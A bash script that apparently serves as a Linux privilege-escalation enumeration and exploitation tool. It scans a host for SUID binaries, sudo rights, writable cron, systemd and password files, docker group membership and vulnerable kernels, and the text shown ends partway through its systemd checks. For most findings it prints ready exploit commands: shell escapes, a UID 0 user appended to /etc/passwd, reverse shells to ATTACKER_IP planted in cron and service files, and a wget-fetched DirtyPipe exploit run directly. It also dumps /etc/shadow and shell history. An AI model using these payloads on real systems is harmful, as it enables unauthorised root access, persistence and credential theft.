#!/bin/bash

################################################################################
# Linux Privilege Escalation Enumeration Tool
# Comprehensive script to find privilege escalation vulnerabilities
################################################################################

# Enhanced Colors
RED='\033[0;31m'
BRIGHT_RED='\033[1;31m'
GREEN='\033[0;32m'
BRIGHT_GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BRIGHT_BLUE='\033[1;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
GRAY='\033[0;37m'
NC='\033[0m' # No Color

TOTAL_CHECKS=25
CURRENT_CHECK=0

clear
echo -e "${CYAN}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ██╗     ██╗███╗   ██╗██████╗ ███████╗ █████╗ ███████╗              ║
║   ██║     ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗██╔════╝              ║
║   ██║     ██║██╔██╗ ██║██████╔╝█████╗  ███████║███████╗              ║
║   ██║     ██║██║╚██╗██║██╔═══╝ ██╔══╝  ██╔══██║╚════██║              ║
║   ███████╗██║██║ ╚████║██║     ███████╗██║  ██║███████║              ║
║   ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝              ║
║                                                                      ║
║   Privilege Escalation Enumeration & Exploitation Tool               ║
║   Comprehensive Vulnerability Scanner with Exploit Methods           ║
║   Powered by: https://github.com/MadExploits                         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

OUTPUT_FILE="privilege_escalation_report_$(date +%Y%m%d_%H%M%S).txt"
EXPLOIT_FILE="exploit_methods_$(date +%Y%m%d_%H%M%S).txt"

# Fungsi logging
log() {
    echo -e "$1" | tee -a "$OUTPUT_FILE"
}

log_exploit() {
    echo -e "$1" | tee -a "$EXPLOIT_FILE"
}

# Progress bar
progress() {
    CURRENT_CHECK=$((CURRENT_CHECK + 1))
    PERCENT=$((CURRENT_CHECK * 100 / TOTAL_CHECKS))
    BAR_LENGTH=50
    FILLED=$((PERCENT * BAR_LENGTH / 100))
    BAR=$(printf "%${FILLED}s" | tr ' ' '█')
    EMPTY=$(printf "%$((BAR_LENGTH - FILLED))s" | tr ' ' '░')
    echo -ne "\r${CYAN}[${BAR}${EMPTY}] ${PERCENT}% - Checking: $1${NC}"
}

section() {
    echo ""
    echo -e "${BRIGHT_GREEN}"
    echo "╔══════════════════════════════════════════════════════════════════════╗"
    printf "║ %-68s ║\n" "$1"
    echo "╚══════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    log ""
    log "═══════════════════════════════════════════════════════════════════════"
    log "$1"
    log "═══════════════════════════════════════════════════════════════════════"
}

# Warning dengan icon
warning() {
    echo -e "${YELLOW}[!] WARNING:${NC} $1" | tee -a "$OUTPUT_FILE"
}

critical() {
    echo -e "${BRIGHT_RED}[!!!] CRITICAL:${NC} $1" | tee -a "$OUTPUT_FILE"
}

info() {
    echo -e "${BLUE}[*]${NC} $1" | tee -a "$OUTPUT_FILE"
}

success() {
    echo -e "${GREEN}[+]${NC} $1" | tee -a "$OUTPUT_FILE"
}

show_exploit() {
    local vuln_name="$1"
    local exploit_method="$2"
    local example="$3"
    
    echo -e "${MAGENTA}"
    echo "┌──────────────────────────────────────────────────────────────────────┐"
    echo "│ EXPLOIT METHOD: $vuln_name"
    echo "├──────────────────────────────────────────────────────────────────────┤"
    echo -e "${NC}"
    echo -e "${CYAN}Method:${NC}"
    echo -e "$exploit_method"
    if [ -n "$example" ]; then
        echo ""
        echo -e "${YELLOW}Example:${NC}"
        echo -e "${GRAY}$example${NC}"
    fi
    echo -e "${MAGENTA}└──────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    
    log_exploit ""
    log_exploit "═══════════════════════════════════════════════════════════════════════"
    log_exploit "EXPLOIT: $vuln_name"
    log_exploit "═══════════════════════════════════════════════════════════════════════"
    log_exploit "Method: $exploit_method"
    if [ -n "$example" ]; then
        log_exploit ""
        log_exploit "Example:"
        log_exploit "$example"
    fi
    log_exploit ""
}

log "╔═══════════════════════════════════════════════════════════════════════╗"
log "║   Linux Privilege Escalation Enumeration Report                       ║"
log "╚═══════════════════════════════════════════════════════════════════════╝"
log ""
log "Generated: $(date)"
log "User: $(whoami)"
log "Hostname: $(hostname)"
log "Kernel: $(uname -r)"
log "OS: $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2 || echo 'Unknown')"
log ""

################################################################################
# 1. SYSTEM INFORMATION
################################################################################
progress "System Information"
section "1. SYSTEM INFORMATION"

info "Current user: $(whoami)"
info "User ID: $(id)"
info "Groups: $(groups)"
info "Home directory: $HOME"
info "Current directory: $(pwd)"
info "Shell: $SHELL"
info "PATH: $PATH"
info "Sudo version: $(sudo -V 2>/dev/null | head -n1 || echo 'Not available')"

log ""
info "Users with shell access:"
cat /etc/passwd 2>/dev/null | grep -v nologin | grep -v false | cut -d: -f1,7 | tee -a "$OUTPUT_FILE"

log ""
info "Sudoers configuration:"
if [ -r /etc/sudoers ]; then
    grep -v "^#" /etc/sudoers 2>/dev/null | grep -v "^$" | tee -a "$OUTPUT_FILE"
else
    warning "Cannot read /etc/sudoers"
fi

if [ -d /etc/sudoers.d ]; then
    info "Sudoers.d files:"
    for file in /etc/sudoers.d/*; do
        if [ -r "$file" ]; then
            log "  File: $file"
            grep -v "^#" "$file" 2>/dev/null | grep -v "^$" | tee -a "$OUTPUT_FILE"
        fi
    done
fi

################################################################################
# 2. SUID/SGID BINARIES
################################################################################
progress "SUID/SGID Binaries"
section "2. SUID/SGID BINARIES"

SUID_FOUND=0
EXPLOITABLE_SUID=()

info "Finding SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ]; then
        SUID_FOUND=1
        log "  ${YELLOW}SUID:${NC} $file"
        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
        basename_file=$(basename "$file")
        case "$basename_file" in
            nmap|vim|nano|less|more|awk|find|bash|sh|python|python3|perl|ruby|php|node|npm|docker|kubectl|gdb|strace|tcpdump|wireshark|base64|xxd|timeout|nice|taskset|ionice|stdbuf|setarch|unshare|pkexec)
                critical "Potentially exploitable SUID binary: $file"
                EXPLOITABLE_SUID+=("$file")
                
                # Show exploit method based on binary
                case "$basename_file" in
                    find)
                        show_exploit "SUID find Binary" \
                            "Use find to execute commands with root privileges." \
                            "find / -name test -exec /bin/bash -p \;"
                        ;;
                    bash|sh)
                        show_exploit "SUID bash/sh Binary" \
                            "If bash/sh has SUID, it may drop privileges. Try: bash -p" \
                            "bash -p\n# or\n./bash -p"
                        ;;
                    python|python3)
                        show_exploit "SUID Python Binary" \
                            "Python can execute system commands. Import os and execute commands." \
                            "python3 -c 'import os; os.system(\"/bin/bash\")'\n# or\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
                        ;;
                    vim|nano|less|more)
                        show_exploit "SUID Editor Binary ($basename_file)" \
                            "Use editor to read/write files or escape to shell." \
                            "$basename_file\n# In vim: :!/bin/bash\n# In less/more: !/bin/bash"
                        ;;
                    nmap)
                        show_exploit "SUID Nmap Binary" \
                            "Older nmap versions support interactive mode. Use --interactive then !sh" \
                            "nmap --interactive\nnmap> !sh"
                        ;;
                    docker)
                        show_exploit "SUID Docker Binary" \
                            "Docker can be used to escape to host. Run container with root on host." \
                            "docker run -v /:/mnt -it alpine chroot /mnt bash"
                        ;;
                    gdb)
                        show_exploit "SUID GDB Binary" \
                            "GDB can execute shell commands." \
                            "gdb -nx -ex 'python import os; os.setuid(0)' -ex 'python os.system(\"/bin/bash\")' -ex quit"
                        ;;
                    strace)
                        show_exploit "SUID Strace Binary" \
                            "Strace can execute commands via -e option." \
                            "strace -o /dev/null /bin/bash"
                        ;;
                    pkexec)
                        show_exploit "SUID pkexec Binary" \
                            "pkexec may be vulnerable to PwnKit (CVE-2021-4034)." \
                            "Check for PwnKit exploit: https://github.com/arthepsy/CVE-2021-4034"
                        ;;
                esac
                ;;
        esac
    fi
done

log ""
info "Finding SGID binaries..."
find / -perm -2000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ]; then
        log "  ${YELLOW}SGID:${NC} $file"
        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

log ""
info "Finding files with both SUID and SGID..."
find / -perm -6000 -type f 2>/dev/null | while read -r file; do
    if [ -f "$file" ]; then
        critical "SUID+SGID: $file"
        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 3. SUDO PERMISSIONS
################################################################################
progress "Sudo Permissions"
section "3. SUDO PERMISSIONS"

if command -v sudo >/dev/null 2>&1; then
    info "Checking sudo permissions for current user..."
    SUDO_OUTPUT=$(sudo -l 2>/dev/null)
    echo "$SUDO_OUTPUT" | tee -a "$OUTPUT_FILE"
    
    if echo "$SUDO_OUTPUT" | grep -q "NOPASSWD"; then
        warning "User can run commands without password!"
        show_exploit "Sudo NOPASSWD" \
            "Commands with NOPASSWD can be executed without password. Check which commands are allowed." \
            "sudo -l\n# Then execute allowed commands:\nsudo <allowed_command>"
    fi
    
    # Check for specific dangerous commands
    dangerous_commands=("ALL" "chmod" "chown" "vim" "nano" "less" "more" "awk" "find" "nmap" "python" "python3" "perl" "ruby" "bash" "sh" "docker" "kubectl" "tar" "zip" "unzip" "git" "ftp" "wget" "curl")
    for cmd in "${dangerous_commands[@]}"; do
        if echo "$SUDO_OUTPUT" | grep -qi "$cmd"; then
            critical "Dangerous sudo permission found: $cmd"
            
            case "$cmd" in
                ALL)
                    show_exploit "Sudo ALL Permission" \
                        "User can run ALL commands as root without restrictions." \
                        "sudo su\n# or\nsudo /bin/bash"
                    ;;
                vim|nano|less|more)
                    show_exploit "Sudo Editor ($cmd)" \
                        "Use editor to read/write files or escape to shell." \
                        "sudo $cmd /etc/passwd\n# In vim: :!/bin/bash\n# In less/more: !/bin/bash"
                    ;;
                python|python3)
                    show_exploit "Sudo Python" \
                        "Python can execute system commands with root privileges." \
                        "sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
                    ;;
                find)
                    show_exploit "Sudo Find" \
                        "Find can execute commands." \
                        "sudo find / -name test -exec /bin/bash \\;"
                    ;;
                tar|zip|unzip)
                    show_exploit "Sudo Archive Tools ($cmd)" \
                        "Archive tools can be used to read/write files or execute commands." \
                        "sudo $cmd -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"
                    ;;
                git)
                    show_exploit "Sudo Git" \
                        "Git can execute arbitrary commands via hooks or config." \
                        "sudo git -p help config\n# Then type: !/bin/bash"
                    ;;
                docker)
                    show_exploit "Sudo Docker" \
                        "Docker can be used to escape to host with root privileges." \
                        "sudo docker run -v /:/mnt -it alpine chroot /mnt bash"
                    ;;
            esac
        fi
    done
    
    # Check for sudo version vulnerabilities
    SUDO_VERSION=$(sudo -V 2>/dev/null | head -n1 | grep -oP 'Sudo version \K[0-9.]+' || echo "")
    if [ -n "$SUDO_VERSION" ]; then
        MAJOR=$(echo "$SUDO_VERSION" | cut -d. -f1)
        MINOR=$(echo "$SUDO_VERSION" | cut -d. -f2)
        
        # CVE-2019-14287 (sudo < 1.8.28)
        if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -lt 8 ]; then
            warning "Potential CVE-2019-14287 vulnerability (sudo < 1.8.28)"
            show_exploit "CVE-2019-14287 (Sudo Bypass)" \
                "If user has ALL=(ALL, !root) permission, can bypass with UID -1." \
                "sudo -u#-1 /bin/bash"
        fi
        
        # CVE-2021-3156 (sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1)
        if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -eq 8 ]; then
            PATCH=$(echo "$SUDO_VERSION" | cut -d. -f3 | cut -dp -f1)
            if [ "$PATCH" -lt 32 ]; then
                warning "Potential CVE-2021-3156 vulnerability (Baron Samedit)"
                show_exploit "CVE-2021-3156 (Baron Samedit)" \
                    "Heap-based buffer overflow in sudo. Exploit available on GitHub." \
                    "Check: https://github.com/blasty/CVE-2021-3156"
            fi
        fi
    fi
else
    warning "sudo command not found"
fi

################################################################################
# 4. WORLD-WRITABLE FILES AND DIRECTORIES
################################################################################
progress "World-Writable Files"
section "4. WORLD-WRITABLE FILES AND DIRECTORIES"

info "Finding world-writable files (excluding /proc, /sys, /dev)..."
WW_FILES=0
find / -type f -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50 | while read -r file; do
    if [ -f "$file" ]; then
        WW_FILES=1
        log "  ${YELLOW}World-writable:${NC} $file"
        ls -la "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
        
        # Check if it's a service file or script
        if echo "$file" | grep -qE "(\.sh$|\.py$|\.pl$|service|init\.d)"; then
            critical "World-writable script/service file: $file"
            show_exploit "World-Writable Script" \
                "Modify the script to add reverse shell or add user." \
                "echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $file\n# Or add user:\necho 'user:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd"
        fi
    fi
done

log ""
info "Finding world-writable directories..."
find / -type d -perm -002 ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50 | while read -r dir; do
    if [ -d "$dir" ]; then
        log "  ${YELLOW}World-writable dir:${NC} $dir"
        ls -lad "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        
        # Check if it's in PATH
        if echo "$PATH" | grep -q "$dir"; then
            critical "World-writable directory in PATH: $dir"
            show_exploit "World-Writable PATH Directory" \
                "Create malicious binary with same name as system command in this directory." \
                "echo -e '#!/bin/bash\n/bin/bash' > $dir/ls\nchmod +x $dir/ls\n# When root runs 'ls', your script executes"
        fi
    fi
done

################################################################################
# 5. CRON JOBS
################################################################################
progress "Cron Jobs"
section "5. CRON JOBS"

info "System-wide cron jobs (/etc/crontab):"
if [ -r /etc/crontab ]; then
    CRON_CONTENT=$(cat /etc/crontab 2>/dev/null)
    echo "$CRON_CONTENT" | tee -a "$OUTPUT_FILE"
    
    # Check for wildcards or writable scripts
    if echo "$CRON_CONTENT" | grep -qE "\*|\.sh|\.py"; then
        warning "Cron job contains wildcards or scripts - check for exploitation"
    fi
else
    warning "Cannot read /etc/crontab"
fi

log ""
info "Cron directories:"
for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    if [ -d "$dir" ]; then
        log "  Directory: $dir"
        ls -la "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        for file in "$dir"/*; do
            if [ -f "$file" ] && [ -r "$file" ]; then
                log "    File: $file"
                FILE_CONTENT=$(cat "$file" 2>/dev/null)
                echo "$FILE_CONTENT" | tee -a "$OUTPUT_FILE"
                
                # Check if script is writable
                if [ -w "$file" ]; then
                    critical "Writable cron file: $file"
                    show_exploit "Writable Cron File" \
                        "Modify the cron file to execute your payload as root." \
                        "echo '* * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> $file"
                fi
            fi
        done
    fi
done

log ""
info "User cron jobs:"
USER_CRON=$(crontab -l 2>/dev/null)
if [ $? -eq 0 ]; then
    echo "$USER_CRON" | tee -a "$OUTPUT_FILE"
else
    info "No user cron jobs found"
fi

log ""
info "Checking for writable cron files..."
find /etc/cron* -type f -writable 2>/dev/null | while read -r file; do
    critical "Writable cron file: $file"
    show_exploit "Writable Cron File" \
        "Add malicious cron job that runs as root." \
        "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> $file"
done

################################################################################
# 6. CAPABILITIES
################################################################################
progress "Linux Capabilities"
section "6. LINUX CAPABILITIES"

if command -v getcap >/dev/null 2>&1; then
    info "Files with capabilities:"
    getcap -r / 2>/dev/null | while read -r line; do
        log "  ${YELLOW}Capability:${NC} $line"
        # Check for dangerous capabilities
        if echo "$line" | grep -q "cap_setuid\|cap_setgid\|cap_sys_admin\|cap_dac_override"; then
            critical "Dangerous capability found: $line"
            
            BINARY=$(echo "$line" | awk '{print $1}')
            CAPS=$(echo "$line" | awk '{print $2}')
            
            if echo "$CAPS" | grep -q "cap_setuid"; then
                show_exploit "cap_setuid Capability" \
                    "Binary can set UID. May be exploitable to gain root." \
                    "$BINARY\n# Or check if binary can be exploited to setuid(0)"
            fi
            
            if echo "$CAPS" | grep -q "cap_dac_override"; then
                show_exploit "cap_dac_override Capability" \
                    "Binary can bypass file read/write permissions." \
                    "Use $BINARY to read /etc/shadow or other protected files"
            fi
        fi
    done
else
    warning "getcap command not found"
fi

################################################################################
# 7. ENVIRONMENT VARIABLES
################################################################################
progress "Environment Variables"
section "7. ENVIRONMENT VARIABLES"

info "PATH variable: $PATH"
if echo "$PATH" | grep -q "\.\|::"; then
    warning "PATH contains current directory (.) or empty entry (::)"
    show_exploit "PATH Manipulation" \
        "Current directory in PATH allows executing local binaries before system ones." \
        "Create malicious binary:\necho '#!/bin/bash\n/bin/bash' > ./ls\nchmod +x ./ls\n# When root runs commands, your binary executes first"
fi

log ""
info "LD_PRELOAD: ${LD_PRELOAD:-Not set}"
if [ -n "$LD_PRELOAD" ]; then
    warning "LD_PRELOAD is set: $LD_PRELOAD"
    show_exploit "LD_PRELOAD Hijacking" \
        "If sudo allows LD_PRELOAD, can load malicious library." \
        "Create malicious library and use with sudo:\nsudo LD_PRELOAD=/path/to/malicious.so <command>"
fi

info "LD_LIBRARY_PATH: ${LD_LIBRARY_PATH:-Not set}"

log ""
info "All environment variables:"
env | sort | tee -a "$OUTPUT_FILE"

################################################################################
# 8. NETWORK INFORMATION
################################################################################
progress "Network Information"
section "8. NETWORK INFORMATION"

info "Network interfaces:"
ip addr show 2>/dev/null || ifconfig 2>/dev/null | tee -a "$OUTPUT_FILE"

log ""
info "Listening ports:"
netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null | tee -a "$OUTPUT_FILE"

log ""
info "Network connections:"
netstat -an 2>/dev/null || ss -an 2>/dev/null | tee -a "$OUTPUT_FILE"

################################################################################
# 9. PROCESSES AND SERVICES
################################################################################
progress "Processes and Services"
section "9. PROCESSES AND SERVICES"

info "Running processes (as root):"
ps aux | grep -E "^root" | head -20 | tee -a "$OUTPUT_FILE"

log ""
info "All processes:"
ps aux | head -30 | tee -a "$OUTPUT_FILE"

log ""
info "Services status:"
if command -v systemctl >/dev/null 2>&1; then
    systemctl list-units --type=service --state=running 2>/dev/null | head -30 | tee -a "$OUTPUT_FILE"
fi

################################################################################
# 10. PASSWORD FILES
################################################################################
progress "Password Files"
section "10. PASSWORD FILES"

info "Checking /etc/passwd:"
if [ -r /etc/passwd ]; then
    cat /etc/passwd | tee -a "$OUTPUT_FILE"
    # Check for users with UID 0
    if grep -q ":0:" /etc/passwd; then
        warning "Users with UID 0 found:"
        grep ":0:" /etc/passwd | tee -a "$OUTPUT_FILE"
    fi
else
    warning "Cannot read /etc/passwd"
fi

log ""
info "Checking /etc/shadow:"
if [ -r /etc/shadow ]; then
    warning "Shadow file is readable!"
    cat /etc/shadow | tee -a "$OUTPUT_FILE"
    show_exploit "Readable /etc/shadow" \
        "Extract password hashes and crack them with John the Ripper or Hashcat." \
        "john /etc/shadow\n# or\nhashcat -m 1800 /etc/shadow /usr/share/wordlists/rockyou.txt"
else
    info "Shadow file not readable (normal)"
fi

log ""
info "Checking for backup password files:"
for file in /etc/passwd- /etc/shadow- /etc/passwd.bak /etc/shadow.bak; do
    if [ -r "$file" ]; then
        warning "Backup password file found: $file"
        head -20 "$file" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 11. SSH KEYS AND CONFIGURATION
################################################################################
progress "SSH Keys"
section "11. SSH KEYS AND CONFIGURATION"

info "SSH authorized_keys:"
if [ -f ~/.ssh/authorized_keys ]; then
    cat ~/.ssh/authorized_keys 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

log ""
info "SSH private keys:"
find ~ -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read -r key; do
    if [ -f "$key" ]; then
        log "  Found: $key"
        ls -la "$key" 2>/dev/null | tee -a "$OUTPUT_FILE"
        show_exploit "SSH Private Key" \
            "Use private key to SSH into the system." \
            "chmod 600 $key\nssh -i $key user@target_host"
    fi
done

log ""
info "SSH configuration:"
if [ -f ~/.ssh/config ]; then
    cat ~/.ssh/config 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

log ""
info "Root SSH keys:"
if [ -f /root/.ssh/authorized_keys ]; then
    warning "Root authorized_keys found!"
    cat /root/.ssh/authorized_keys 2>/dev/null | tee -a "$OUTPUT_FILE"
fi

################################################################################
# 12. HISTORY FILES
################################################################################
progress "History Files"
section "12. HISTORY FILES"

info "Bash history:"
if [ -f ~/.bash_history ]; then
    tail -50 ~/.bash_history 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    # Check for passwords or sensitive info
    if grep -qiE "password|passwd|secret|key|token" ~/.bash_history 2>/dev/null; then
        warning "Potential credentials found in bash history!"
    fi
else
    info "No bash history found"
fi

log ""
info "Other history files:"
for hist in ~/.zsh_history ~/.sh_history ~/.python_history ~/.mysql_history; do
    if [ -f "$hist" ]; then
        log "  Found: $hist"
        tail -20 "$hist" 2>/dev/null | tee -a "$OUTPUT_FILE"
    fi
done

################################################################################
# 13. WRITABLE SYSTEM FILES
################################################################################
progress "Writable System Files"
section "13. WRITABLE SYSTEM FILES"

info "Checking for writable /etc/passwd:"
if [ -w /etc/passwd ]; then
    critical "/etc/passwd is writable!"
    show_exploit "Writable /etc/passwd" \
        "Add new user with root privileges (UID 0)." \
        "echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd\nsu hacker\n# Enter password when prompted"
fi

info "Checking for writable /etc/shadow:"
if [ -w /etc/shadow ]; then
    critical "/etc/shadow is writable!"
    show_exploit "Writable /etc/shadow" \
        "Change root password hash or add new user." \
        "# Generate password hash:\nopenssl passwd -1 newpassword\n# Replace root's hash in /etc/shadow\n# Or add new user entry"
fi

info "Checking for writable /etc/sudoers:"
if [ -w /etc/sudoers ]; then
    critical "/etc/sudoers is writable!"
    show_exploit "Writable /etc/sudoers" \
        "Add your user to sudoers with NOPASSWD." \
        "echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers\nsudo su"
fi

info "Checking for writable /etc/sudoers.d:"
if [ -w /etc/sudoers.d ]; then
    critical "/etc/sudoers.d is writable!"
    show_exploit "Writable /etc/sudoers.d" \
        "Create new sudoers file with full privileges." \
        "echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/exploit\nsudo su"
fi

################################################################################
# 14. DOCKER AND CONTAINERS
################################################################################
progress "Docker and Containers"
section "14. DOCKER AND CONTAINERS"

if command -v docker >/dev/null 2>&1; then
    info "Docker version:"
    docker --version 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Docker containers:"
    docker ps -a 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Docker images:"
    docker images 2>/dev/null | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Checking if user is in docker group:"
    if groups | grep -q docker; then
        critical "User is in docker group - potential container escape!"
        show_exploit "Docker Group Privilege Escalation" \
            "Mount host filesystem and chroot to gain root on host." \
            "docker run -v /:/mnt -it alpine chroot /mnt bash\n# Or:\ndocker run --rm -v /:/mnt -it alpine sh -c 'chroot /mnt bash'"
    fi
else
    info "Docker not found"
fi

################################################################################
# 15. KERNEL VERSION AND EXPLOITS
################################################################################
progress "Kernel Version"
section "15. KERNEL VERSION"

KERNEL_VERSION=$(uname -r)
KERNEL_MAJOR=$(echo "$KERNEL_VERSION" | cut -d. -f1)
KERNEL_MINOR=$(echo "$KERNEL_VERSION" | cut -d. -f2)
info "Kernel version: $KERNEL_VERSION"
info "Kernel architecture: $(uname -m)"

log ""
info "Checking for known vulnerable kernel versions..."

# Check for some well-known kernel exploits
if [ "$KERNEL_MAJOR" -lt 3 ] || ([ "$KERNEL_MAJOR" -eq 3 ] && [ "$KERNEL_MINOR" -lt 10 ]); then
    warning "Very old kernel - many vulnerabilities possible"
fi

# Dirty COW (CVE-2016-5195) - Linux 2.6.22 < 4.8.3
if [ "$KERNEL_MAJOR" -lt 4 ] || ([ "$KERNEL_MAJOR" -eq 4 ] && [ "$KERNEL_MINOR" -lt 8 ]); then
    warning "Potential Dirty COW vulnerability (CVE-2016-5195)"
    show_exploit "Dirty COW (CVE-2016-5195)" \
        "Race condition in copy-on-write. Exploit available." \
        "Check: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs"
fi

# DirtyPipe (CVE-2022-0847) - Linux 5.8 <= 5.16.11, 5.10.102, 5.15.25, 5.17
KERNEL_PATCH=$(echo "$KERNEL_VERSION" | cut -d. -f3 | cut -d- -f1)
DIRTYPIPE_VULN=0

if [ "$KERNEL_MAJOR" -eq 5 ]; then
    if [ "$KERNEL_MINOR" -ge 8 ] && [ "$KERNEL_MINOR" -le 16 ]; then
        if [ "$KERNEL_MINOR" -eq 16 ]; then
            # 5.16.x - vulnerable if < 5.16.12
            if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -lt 12 ]; then
                DIRTYPIPE_VULN=1
            elif [ -z "$KERNEL_PATCH" ]; then
                # If patch version not available, check if it's < 5.16.12
                DIRTYPIPE_VULN=1
            fi
        else
            # 5.8 to 5.15 - all versions vulnerable
            DIRTYPIPE_VULN=1
        fi
    elif [ "$KERNEL_MINOR" -eq 10 ]; then
        # 5.10.102 is vulnerable (fixed in 5.10.103)
        if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -eq 102 ]; then
            DIRTYPIPE_VULN=1
        elif [ -z "$KERNEL_PATCH" ]; then
            DIRTYPIPE_VULN=1
        fi
    elif [ "$KERNEL_MINOR" -eq 15 ]; then
        # 5.15.25 is vulnerable (fixed in 5.15.26)
        if [ -n "$KERNEL_PATCH" ] && [ "$KERNEL_PATCH" -eq 25 ]; then
            DIRTYPIPE_VULN=1
        elif [ -z "$KERNEL_PATCH" ]; then
            DIRTYPIPE_VULN=1
        fi
    elif [ "$KERNEL_MINOR" -eq 17 ]; then
        # 5.17 is vulnerable (fixed in 5.17.1)
        if [ -z "$KERNEL_PATCH" ] || [ "$KERNEL_PATCH" -eq 0 ]; then
            DIRTYPIPE_VULN=1
        fi
    fi
fi

if [ "$DIRTYPIPE_VULN" -eq 1 ]; then
    critical "Potential DirtyPipe vulnerability (CVE-2022-0847) detected!"
    show_exploit "DirtyPipe (CVE-2022-0847)" \
        "Uninitialized variable in pipe implementation allows overwriting arbitrary files. Can be used to inject code into SUID binaries or modify /etc/passwd." \
        "# Method 1: Modify /etc/passwd to add root user\n# Check: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit\n\n# Method 2: Inject into SUID binary\n# Download exploit:\ngit clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit.git\ncd CVE-2022-0847-DirtyPipe-Exploit\nmake\n./exploit\n\n# Or use ready exploit:\nwget https://raw.githubusercontent.com/imfiver/CVE-2022-0847/main/LPE.sh\nchmod +x LPE.sh\n./LPE.sh"
fi

# Check for other CVEs
show_exploit "Kernel Exploit Research" \
    "Research kernel exploits for your specific version." \
    "Search: 'linux kernel $(uname -r) exploit'\nCheck: https://www.exploit-db.com\nCheck: https://github.com/SecWiki/linux-kernel-exploits"

################################################################################
# 16. NFS SHARES
################################################################################
progress "NFS Shares"
section "16. NFS SHARES"

info "NFS exports:"
if [ -r /etc/exports ]; then
    EXPORTS=$(cat /etc/exports 2>/dev/null)
    echo "$EXPORTS" | tee -a "$OUTPUT_FILE"
    
    if echo "$EXPORTS" | grep -q "no_root_squash"; then
        warning "NFS share with no_root_squash found!"
        show_exploit "NFS no_root_squash" \
            "Mount NFS share and create SUID binary on it." \
            "# On attacker machine:\nmkdir /tmp/nfs\nmount -t nfs TARGET_IP:/share /tmp/nfs\ncd /tmp/nfs\ngcc -o shell shell.c\nchmod +s shell\n# On target, execute the binary"
    fi
else
    info "No /etc/exports file found"
fi

log ""
info "Mounted NFS shares:"
mount | grep nfs 2>/dev/null | tee -a "$OUTPUT_FILE"

################################################################################
# 17. WRITABLE SCRIPTS IN PATH
################################################################################
progress "Writable PATH Scripts"
section "17. WRITABLE SCRIPTS IN PATH"

info "Checking for writable scripts in PATH directories..."
IFS=':' read -ra ADDR <<< "$PATH"
for dir in "${ADDR[@]}"; do
    if [ -d "$dir" ] && [ -w "$dir" ]; then
        critical "Writable directory in PATH: $dir"
        ls -la "$dir" 2>/dev/null | tee -a "$OUTPUT_FILE"
        show_exploit "PATH Hijacking" \
            "Create malicious binary with name of common command (ls, cat, etc.)" \
            "echo -e '#!/bin/bash\n/bin/bash' > $dir/ls\nchmod +x $dir/ls\n# When root runs 'ls', your script executes"
    fi
done

################################################################################
# 18. SYSTEMD SERVICES
################################################################################
progress "Systemd Services"
section "18. SYSTEMD SERVICES"

if command -v systemctl >/dev/null 2>&1; then
    info "Writable systemd service files:"
    find /etc/systemd/system -type f -writable 2>/dev/null | while read -r file; do
        critical "Writable systemd service: $file"
        show_exploit "Writable Systemd Service" \
            "Modify service file to execute your payload, then reload and restart." \
            "echo -e '[Service]\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' > $file\nsystemctl daemon-reload\nsystemctl restart $(basename $file .service)"
    done
    
    log ""
    info "User systemd services:"
    systemctl --user list-units --type=service 2>/dev/null | head -20 | tee -a "$OUTPUT_FILE"
    
    log ""
    info "Writable user systemd services:"
